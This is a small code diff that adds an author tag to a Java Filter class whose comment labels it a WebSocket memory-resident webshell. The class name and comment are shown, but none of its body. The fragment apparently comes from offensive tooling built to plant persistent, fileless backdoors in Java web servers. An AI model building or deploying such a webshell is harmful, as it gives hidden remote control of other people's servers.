@@ -9,6 +9,7 @@ import java.util.List;
 
 /**
  * WebSocket 内存马
+ * @author nu1r
  */
 public class WSFMSFromThread implements Filter {
 
